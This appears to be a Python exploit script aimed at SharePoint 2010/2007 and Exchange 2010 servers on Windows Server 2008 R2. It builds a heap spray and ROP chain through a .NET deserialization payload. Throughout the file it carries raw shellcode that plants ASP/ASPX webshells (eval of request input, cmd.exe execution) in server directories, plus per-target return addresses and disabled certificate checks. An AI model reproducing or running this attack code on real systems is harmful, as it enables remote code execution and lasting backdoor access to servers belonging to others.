import json
import struct
import JSON2dotnetBinaryFormatter
import JSON2ViewState
import ViewStateExample
from base64 import b64decode, b64encode, urlsafe_b64encode,encodestring
import sys
from urllib import quote_plus, urlencode
import json
import struct
import urllib2
from ntlm import HTTPNtlmAuthHandler
import socket
socket.setdefaulttimeout(30*30)
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context
    

def q(i):
    return struct.pack("<Q", i)

# create shellcode depend on target_server and target_software
def create_shellcode(target_server, target_software):
    buf =  ""
    if target_software == "sharepoint_2010_nosp":
        # create webshell s.asp in c:\program files\common files\microsoft shared\web server extensions\14\isapi\anonsvc\s.asp
        # <% eval request("a") %>
        print "[+] use webshell s.asp for sharepoint_2010_nosp"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78"
        buf += "\x65\x20\x2f\x63\x20\x65\x63\x68\x6f\x20\x5e\x3c\x5e"
        buf += "\x25\x65\x76\x61\x6c\x20\x72\x65\x71\x75\x65\x73\x74"
        buf += "\x5e\x28\x5e\x22\x61\x5e\x22\x5e\x29\x5e\x25\x5e\x3e"
        buf += "\x20\x3e\x20\x22\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61"
        buf += "\x6d\x20\x46\x69\x6c\x65\x73\x5c\x43\x6f\x6d\x6d\x6f"
        buf += "\x6e\x20\x46\x69\x6c\x65\x73\x5c\x4d\x69\x63\x72\x6f"
        buf += "\x73\x6f\x66\x74\x20\x53\x68\x61\x72\x65\x64\x5c\x57"
        buf += "\x65\x62\x20\x53\x65\x72\x76\x65\x72\x20\x45\x78\x74"
        buf += "\x65\x6e\x73\x69\x6f\x6e\x73\x5c\x31\x34\x5c\x69\x73"
        buf += "\x61\x70\x69\x5c\x61\x6e\x6f\x6e\x73\x76\x63\x5c\x73"
        buf += "\x2e\x61\x73\x70\x22\x00"
    elif target_software == "sharepoint_2010_nosp":
        # create webshell t.asp in C:\program files\common files\microsoft shared\web server extensions\14\isapi\anonsvc\t.asp
        # <% eval request("a") %>
        print "[+] use webshell t.asp for sharepoint_2010_nosp"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78"
        buf += "\x65\x20\x2f\x63\x20\x65\x63\x68\x6f\x20\x5e\x3c\x5e"
        buf += "\x25\x65\x76\x61\x6c\x5e\x20\x72\x65\x71\x75\x65\x73"
        buf += "\x74\x28\x22\x61\x22\x29\x5e\x25\x5e\x3e\x20\x3e\x20"
        buf += "\x22\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61\x6d\x20\x46"
        buf += "\x69\x6c\x65\x73\x5c\x43\x6f\x6d\x6d\x6f\x6e\x20\x46"
        buf += "\x69\x6c\x65\x73\x5c\x4d\x69\x63\x72\x6f\x73\x6f\x66"
        buf += "\x74\x20\x53\x68\x61\x72\x65\x64\x5c\x57\x65\x62\x20"
        buf += "\x53\x65\x72\x76\x65\x72\x20\x45\x78\x74\x65\x6e\x73"
        buf += "\x69\x6f\x6e\x73\x5c\x31\x34\x5c\x69\x73\x61\x70\x69"
        buf += "\x5c\x61\x6e\x6f\x6e\x73\x76\x63\x5c\x74\x2e\x61\x73"
        buf += "\x70\x22\x00"
    elif "exchange_server" in target_software:
        # create s.aspx in c:\program files\microsoft\exchange server\v14\clientaccess\owa\auth\s.aspx
        # <% System.Diagnostics.Proccess.Start("cmd.exe","/c "+Request.Form["a"]); %>
        print "[+] use webshell s.aspx for exchange_server"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78"
        buf += "\x65\x20\x2f\x63\x20\x65\x63\x68\x6f\x20\x5e\x3c\x5e"
        buf += "\x25\x20\x53\x79\x73\x74\x65\x6d\x2e\x44\x69\x61\x67"
        buf += "\x6e\x6f\x73\x74\x69\x63\x73\x2e\x50\x72\x6f\x63\x65"
        buf += "\x73\x73\x2e\x53\x74\x61\x72\x74\x28\x22\x63\x6d\x64"
        buf += "\x2e\x65\x78\x65\x22\x2c\x22\x2f\x63\x20\x22\x2b\x52"
        buf += "\x65\x71\x75\x65\x73\x74\x2e\x46\x6f\x72\x6d\x5b\x22"
        buf += "\x61\x22\x5d\x29\x3b\x20\x5e\x25\x5e\x3e\x20\x20\x3e"
        buf += "\x20\x22\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61\x6d\x20"
        buf += "\x46\x69\x6c\x65\x73\x5c\x4d\x69\x63\x72\x6f\x73\x6f"
        buf += "\x66\x74\x5c\x45\x78\x63\x68\x61\x6e\x67\x65\x20\x53"
        buf += "\x65\x72\x76\x65\x72\x5c\x56\x31\x34\x5c\x43\x6c\x69"
        buf += "\x65\x6e\x74\x41\x63\x63\x65\x73\x73\x5c\x6f\x77\x61"
        buf += "\x5c\x61\x75\x74\x68\x5c\x73\x2e\x61\x73\x70\x78\x22"
        buf += "\x20\x00"
    elif target_software == "sharepoint_office_server_2007_r2_port80":
        # shell write s.asp to C:\inetpub\wwwroot\wss\VirtualDirectories\80\ sharepoint office server 2007 r2
        # <% eval request("a") %>
        print "[+] use webshell s.asp for sharepoint_office_server_2007_r2_port80"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78"
        buf += "\x65\x20\x2f\x63\x20\x65\x63\x68\x6f\x20\x5e\x3c\x5e"
        buf += "\x25\x65\x76\x61\x6c\x20\x72\x65\x71\x75\x65\x73\x74"
        buf += "\x28\x22\x61\x22\x29\x5e\x25\x5e\x3e\x20\x3e\x43\x3a"
        buf += "\x5c\x69\x6e\x65\x74\x70\x75\x62\x5c\x77\x77\x77\x72"
        buf += "\x6f\x6f\x74\x5c\x77\x73\x73\x5c\x56\x69\x72\x74\x75"
        buf += "\x61\x6c\x44\x69\x72\x65\x63\x74\x6f\x72\x69\x65\x73"
        buf += "\x5c\x38\x30\x5c\x73\x2e\x61\x73\x70\x00"
    elif target_software == "sharepoint_office_server_2007_r2_port8080":
        # shell write s.asp to C:\inetpub\wwwroot\wss\VirtualDirectories\8080\
        # <% eval request("a") %>
        print "[+] use webshell s.asp for sharepoint_office_server_2007_r2_port8080"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78"
        buf += "\x65\x20\x2f\x63\x20\x65\x63\x68\x6f\x20\x5e\x3c\x5e"
        buf += "\x25\x65\x76\x61\x6c\x20\x72\x65\x71\x75\x65\x73\x74"
        buf += "\x28\x22\x61\x22\x29\x5e\x25\x5e\x3e\x20\x3e\x43\x3a"
        buf += "\x5c\x69\x6e\x65\x74\x70\x75\x62\x5c\x77\x77\x77\x72"
        buf += "\x6f\x6f\x74\x5c\x77\x73\x73\x5c\x56\x69\x72\x74\x75"
        buf += "\x61\x6c\x44\x69\x72\x65\x63\x74\x6f\x72\x69\x65\x73"
        buf += "\x5c\x38\x30\x38\x30\x5c\x73\x2e\x61\x73\x70\x00"
    else:
        # default run calc.exe
        print "[+] use default calc.exe"
        buf += "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
        buf += "\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
        buf += "\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        buf += "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
        buf += "\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
        buf += "\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
        buf += "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
        buf += "\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
        buf += "\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
        buf += "\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
        buf += "\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
        buf += "\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        buf += "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
        buf += "\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        buf += "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        buf += "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
        buf += "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
        buf += "\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
        buf += "\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
        buf += "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
        buf += "\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
        buf += "\x78\x65\x00"
    return buf

'''
create payload exploit
target_server:
 windows_server_2008_r2_sp1,
 windows_server_2008_r2_nosp
target_software:
  sharepoint_2010_nosp,
  exchange_server_2010_nosp,
  exchange_server_2010_sp3,
  sharepoint_office_server_2007_r2_port80,
  sharepoint_office_server_2007_r2_port8080
'''
def create_payload(kill_process=False,target_server="windows_server_2008_r2_sp1",target_software="sharepoint_2010_nosp", custom_rsp_addr="", custom_nopshellcode_addr=""):
    
    shellcode = create_shellcode(target_server, target_software)

    #pointer = 0x20201040 # r1 sp1
    #pointer = 0x30301040 # r1 nosp
    #rsp = 0x50505000
    #rsp = 0x50505050
    #shellpointer = 0x70505000
    #shellpointer = 0x90909090
    
    header_bmp = open('heapsc.bmp','rb').read(54)
    image_spray_file = 'examples\\ImageSpray.json'
    obj = json.loads(open(image_spray_file).read())
    #print json.dumps(obj)
    
    if target_server == "windows_server_2008_r2_sp1":
        print "[+] use RIP: 0x20201040 for windows_server_2008_r2_sp1"
        obj["1208"][1]["Values"][90] = 0x20 
        obj["1208"][1]["Values"][91] = 0x20 
    elif target_server == "windows_server_2008_r2_nosp":
        print "[+] use RIP: 0x30301040 for windows_server_2008_r2_nosp"
        obj["1208"][1]["Values"][90] = 0x30 
        obj["1208"][1]["Values"][91] = 0x30 

    #print "Address: ", obj["1208"][1]["Values"][85:95]

    heap_data = open('heap.bmp','rb').read()
    if kill_process:
        print "[+] use RIP to TerminateProcess()"
        heap_data = heap_data.replace("\x7c\xba\xf6\x16\x05\x00\x00\x00", "\x7d\xf4\xaf\xff\x42\x06\x00\x00") # change rip to terminate

    if target_server == "windows_server_2008_r2_nosp":
        #heap_data = heap_data.replace(q(0x20201048), q(pointer+0x8))  # change pointer+0x8
        heap_data = heap_data.replace("\x48\x10\x20\x20", "\x48\x10\x30\x30") # exsp3 window 2008 r2 nosp
        #heap_data = heap_data.replace(q(0x20201040), q(pointer))      # change pointer
        heap_data = heap_data.replace("\x40\x10\x20\x20", "\x40\x10\x30\x30") # exsp3 window 2008 r2 nosp
        #heap_data = heap_data.replace(q(0x20201050), q(pointer+0x10))         # change pointer + 0x10
        heap_data = heap_data.replace("\x50\x10\x20\x20", "\x50\x10\x30\x30")

    if custom_rsp_addr != "":
        print "[+] use custom RSP: %s" % hex(int(custom_rsp_addr, 16))
        heap_data.replace("\x40\x40\x40\x40", q(int(custom_rsp_addr, 16)))
    elif target_server == "windows_server_2008_r2_sp1" and target_software == "sharepoint_2010_nosp":
        print "[+] use RSP: 0x50505000 for windows_server_2008_r2_sp1 and sharepoint_2010_nosp"
        heap_data  = heap_data.replace("\x40\x40\x40\x40", "\x00\x50\x50\x50")
        #heap_data = heap_data.replace("\x40\x40\x40\x40", "\x10\x54\x50\x50") # sharepoint window server 2008 r2 sp1
    elif target_server == "windows_server_2008_r2_sp1" and "exchange_server" in target_software:
        print "[+] use RSP: 0x50505220 for windows_server_2008_r2_sp1 and exchange_server"
        heap_data = heap_data.replace("\x40\x40\x40\x40", "\x20\x52\x50\x50")
        
    elif target_server == "windows_server_2008_r2_nosp" and target_software == "sharepoint_2010_nosp" :
        print "[+] use RSP: 0x60606060 for windows_server_2008_r2_nosp and sharepoint_2010_nosp"
        heap_data = heap_data.replace("\x40\x40\x40\x40", "\x60\x60\x60\x60") 
    elif target_server == "windows_server_2008_r2_nosp" and "exchange_server" in target_software:
        print "[+] use RSP: 0x60606310 for windows_server_2008_r2_nosp and exchange_server"
        heap_data = heap_data.replace("\x40\x40\x40\x40", "\x10\x63\x60\x60")
    else:
        print "[+] use RSP: 0x50505000 default"
        heap_data  = heap_data.replace("\x40\x40\x40\x40", "\x00\x50\x50\x50")
        
    
    heap = [ord(ch) for ch in heap_data]
    #print 'len(heap): ', len(heap)
    #print 'first heap: ', heap[0:10]

    #heaprop_data = open('heaprop.bmp','rb').read()
    #heaprop_data = heaprop_data.replace(q(0x50505000), q(shellpointer)) # change shellpointer
    #heaprop_data = heaprop_data.replace("\x00\x50\x50\x50", "\x00\x50\x50\x70")  # sharepoint window server 2008 r2 sp1
    #heaprop_data = heaprop_data.replace("\x00\x50\x50\x50", "\x70\x70\x70\x70")  # exsp3 window server 2008 r2 sp1 
    #heaprop_data = heaprop_data.replace("\x00\x50\x50\x50", "\x90\x90\x90\x90")  # sharepoint window server 2008 r2 no sp
    #heaprop_data = heaprop_data.replace(q(0x20201040), q(pointer))
    #heaprop_data = heaprop_data.replace("\x40\x10\x20\x20", "\x40\x10\x30\x30")
    #heaprop = [ord(ch) for ch in heaprop_data]
    #print 'len(heaprop): ', len(heaprop)
    #print 'first heaprop: ', heaprop[0:10]

    ropchain = ""
    # custom ropchain

    #ropchain += q(0x642ffaf456b) # ; pop rbx; ret;  # load rbx value 0xcccccccccccc
    #ropchain += q(0xcccccccccccccccc)
    #ropchain += q(0x642FFAFD5F3) # ; mov rdx, rdi; mov rcx, rbx; call sub_642FFAFCBC8; mov rax, rdi; jmp short loc_642FFAFD606; mov rax, rbx; add rsp, 28h; pop rdi; pop rbx; retn; # load rcx value 0xccccccccc
    #ropchain += q(0x642FFAFD603) # ; mov rax, rbx; add rsp, 28h; pop rdi; pop rbx; retn; # gan rbx vao rax
    #ropchain += q(0x642FFAF8466) # ; mov rax, rbx; add rsp, 38h; pop rdi; pop rbx; retn 
    #ropchain += "C:\\Windo"
    #ropchain += "ws\\Micro"
    #ropchain += "soft.NET"
    #ropchain += "\\Framewo"
    #ropchain += "rk64\\v2."
    #ropchain += "0.50727\\"
    #ropchain += "diasymre"
    #ropchain += "ader.dll"
    #ropchain += q(0x0)
    #ropchain += q(0x642FFAF859A) # ; call    cs:LoadLibraryW        # load library C:\Windows\Microsoft.NET\Framework64\v2.0.50727\diasymreader.dll
    #ropchain += q(0x642FFAF47D3) # call    cs:__imp_LoadLibraryA
    #ropchain += q(0xdeadbabedefeca7e) * 11

    # pop rdx
    ropchain += q(0x516f36e2a) # ; pop rdx; ret
    ropchain += q(0x20201040) 
    ropchain += q(0x0516f60477) # ; pop r9; mov dword ptr [rdx], eax; xor eax,eax; ret          # ghi 40h vao r9  diasymreader!CDiaSection::get_code+0x17
    ropchain += q(0x0000000040)
    ropchain += q(0x0516f60aeb) # ; pop r8; mov dword ptr [rdx], eax; xor eax,eax; ret          # ghi 1000h vao r8 diasymreader!CDiaFrameData::get_allocatesBasePointer+0x13
    ropchain += q(0x0000001000) #
    ropchain += q(0x0516f36e2a) # ; pop rdx; ret                                                # ghi 2000h vao rdx diasymreader!PDB1::OpenInStream+0x13a
    ropchain += q(0x0000002000)
    ropchain += q(0x0516f352e4)   # ; pop rcx; adc al,ch; ret                                     # ghi 0 vao rcx diasymreader!TPI1::~TPI1+0x120
    ropchain += q(0x0000000000)
    ropchain += q(0x0516f2c04c) # ; pop rax; ret                                                # ghi 0516f011d0 vao rax diasymreader!Safe_wsplitpath+0x70
    ropchain += q(0x0516f011d0) # ; mov al, byte ptr [60000000`0076e367]; adc ah, bl; jbe diasymreader+0x11dd
    ropchain += q(0x0516f34326) # ; jmp qword ptr [rax]                                         # goi ham tai rax  (goi ham VirtualAlloc de cap phat bo nho co quyen execute)
    ropchain += q(0x0516f1d5d1) # ; pop r12; pop rdi; pop rsi; pop rbx; ret                     # ghi deadbabedefeca7e vao r12, rdi, rsi, rbx diasymreader!CopyUniqueDeltas+0x101
    ropchain += q(0xdeadbabedefeca7e)
    ropchain += q(0xdeadbabedefeca7e)
    ropchain += q(0xdeadbabedefeca7e)
    ropchain += q(0xdeadbabedefeca7e)
    ropchain += q(0x0516f36e2a) # ; pop rdx; ret                                                 # ghi 20201040 vao rdx
    ropchain += q(0x20201040)
    ropchain += q(0x0516f616ed) # ; mov rcx,rax; mov rax, rcx; mov rbx, qword ptr [rsp+8]; ret   # ghi dia chi vung nho execute vao rcx
    ropchain += q(0x0516f60aeb) # ; pop r8; mov dword ptr [rdx], eax; xor eax,eax; ret           # ghi 11feh vao r8
    ropchain += q(0x00000011fe)
    ropchain += q(0x0516f36e2a) # ; pop rdx; ret                                                 # ghi 50505000 vap rdx

    if custom_nopshellcode_addr != "":
        print "[+] use custome nopshellcode at %s" % hex(int(custom_nopshellcode_addr, 16))
        ropchain += q(int(custom_nopshellcode_addr, 16))
    elif target_server == "windows_server_2008_r2_sp1" and target_software == "sharepoint_2010_nosp":
        print "[+] use nopshellcode at 0x70505000 for windows_server_2008_r2_sp1 and sharepoint_2010_nosp"
        ropchain += q(0x70505000) 
    elif target_server == "windows_server_2008_r2_sp1" and target_software == "exchange_server_2010_sp3":
        print "[+] use nopshellcode at 0x70707070 for windows_server_2008_r2_sp1 and exchange_server_2010_sp3"
        ropchain += q(0x70707070) 
    elif target_server == "windows_server_2008_r2_sp1" and target_software == "exchange_server_2010_nosp":
        print "[+] use nopshellcode at 0x70707070 for windows_server_2008_r2_sp1 and exchange_server_2010_nosp"
        ropchain += q(0x70707070)
    elif target_server == "windows_server_2008_r2_nosp" and target_software == "sharepoint_2010_nosp":
        print "[+] use nopshellcode at 0x90909090 for windows_server_2008_r2_nosp and sharepoint_2010_nosp"
        ropchain += q(0x90909090)
    else: # default
        print "[+] use nopshellcode at 0x70707070 default"
        ropchain += q(0x70707070)

    ropchain += q(0x0516f2c04c) # ; pop rax; ret                                                 # ghi 0516f01380 vao rax
    ropchain += q(0x0516f01380) #
    ropchain += q(0x0516f34326) # ; jmp qword ptr [rax]                                          # goi ham tai rax   (goi ham memcpy)
    ropchain += q(0x0516f01ad8) # ; push rax; ret                                                # goi ham tai ket qua tra ve
    ropchain += q(0x642FFAF493B) # ; ret
    ropchain_block = ((4096 - len(ropchain))/8)* q(0x642FFAF493B) + ropchain
    heaprop_data = header_bmp + 384 * ropchain_block
    heaprop = [ord(ch) for ch in heaprop_data]
    #print 'len(heaprop): ', len(heaprop)
    #print 'first heaprop: ', heaprop[0:10]

    #heapsc_data = open('heapsc.bmp','rb').read()
    #heapsc_new = heapsc_data[0:64] + chr(0xcc) * ( len(heapsc_data) - 64)
    sc_block = (4096 - len(shellcode)) * "\x90" + shellcode
    heapsc_data = header_bmp + 384 * sc_block
    #heapsc = [ord(ch) for ch in open('heapsc.bmp','rb').read()]
    heapsc = [ord(ch) for ch in heapsc_data]
    #print 'len(heapsc): ', len(heapsc)
    #print 'first heapsc: ', heapsc[0:10]
    # obj 0 for Header
    # obj 1 for Library
    # obj 2 for first object
    # obj 3 for ByteArray
    # obj 4->398+4 for 399 other objects
    # obj 403 for MessageEnd
